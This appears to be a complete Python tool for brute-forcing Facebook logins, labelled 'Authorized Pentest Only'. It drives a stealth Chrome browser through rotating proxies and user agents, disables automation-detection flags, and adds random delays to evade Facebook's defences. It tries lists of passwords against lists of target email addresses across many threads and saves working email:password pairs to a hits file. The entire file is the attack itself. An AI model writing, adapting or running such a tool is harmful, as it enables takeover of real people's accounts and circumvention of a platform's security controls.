#!/usr/bin/env python3
"""
Facebook Login Bruteforce Tool - Authorized Pentest Only
Author: PentestOps
"""
import undetected_chromedriver as uc
import threading, queue, random, time, json, sys
from concurrent.futures import ThreadPoolExecutor
from selenium.webdriver.common.by import By

class FacebookBruteforcer:
    def __init__(self, config_file='config.json'):
        self.config = json.load(open(config_file))
        self.proxies = [l.strip() for l in open(self.config['proxies_file']) if l.strip()]
        self.passwords = [l.strip() for l in open(self.config['passwords_file']) if l.strip()]
        self.targets = [l.strip() for l in open(self.config['targets_file']) if l.strip()]
        self.results = []
        self.stats = {'attempts': 0, 'successes': 0, 'proxies_used': 0}
        self.lock = threading.Lock()
    
    def stealth_driver(self, proxy):
        options = uc.ChromeOptions()
        options.add_argument(f'--proxy-server={proxy}')
        options.add_argument('--no-sandbox')
        options.add_argument('--disable-blink-features=AutomationControlled')
        options.add_argument('--disable-web-security')
        options.add_argument(f'--user-agent={random.choice(self.config["user_agents"])}')
        return uc.Chrome(options=options, version_main=self.config['chrome_version'])
    
    def attempt_login(self, email, password, proxy):
        driver = None
        try:
            self.stats['attempts'] += 1
            driver = self.stealth_driver(proxy)
            driver.get("https://m.facebook.com/login")
            time.sleep(random.uniform(2, 4))
            
            driver.find_element(By.ID, "email").send_keys(email)
            driver.find_element(By.ID, "pass").send_keys(password)
            driver.find_element(By.NAME, "login").click()
            
            time.sleep(random.uniform(3, 6))
            
            # Success indicators
            if any(x in driver.current_url for x in ['home', 'profile', 'facebook.com/']):
                with self.lock:
                    hit = {"email": email, "password": password, "proxy": proxy, "timestamp": time.ctime()}
                    self.results.append(hit)
                    self.stats['successes'] += 1
                    print(f"✅ HIT: {email}:{password}")
                    with open('hits.json', 'w') as f:
                        json.dump(self.results, f, indent=2)
                return True
            
            print(f"❌ {email}:{password}")
            return False
            
        except Exception as e:
            print(f"💥 {email}:{password} -> {str(e)[:50]}")
            return False
        finally:
            if driver: driver.quit()
    
    def run(self):
        print(f"🚀 Starting attack: {len(self.targets)} targets, {len(self.passwords)} passwords")
        with ThreadPoolExecutor(max_workers=self.config['threads']) as executor:
            futures = []
            for email in self.targets:
                pwd_batch = random.sample(self.passwords, self.config['passwords_per_target'])
                for pwd in pwd_batch:
                    proxy = random.choice(self.proxies)
                    self.stats['proxies_used'] += 1
                    future = executor.submit(self.attempt_login, email, pwd, proxy)
                    futures.append(future)
                    time.sleep(random.uniform(0.5, 2))  # Rate limiting
            
            for future in futures:
                future.result()
        
        self.save_stats()
    
    def save_stats(self):
        stats = {**self.stats, **{"total_time": time.time() - self.config.get('start_time', 0)}}
        with open('stats.json', 'w') as f:
            json.dump(stats, f, indent=2)
        print(f"📊 Final: {self.stats['successes']} hits / {self.stats['attempts']} attempts")

if __name__ == "__main__":
    cracker = FacebookBruteforcer()
    cracker.config['start_time'] = time.time()
    cracker.run()
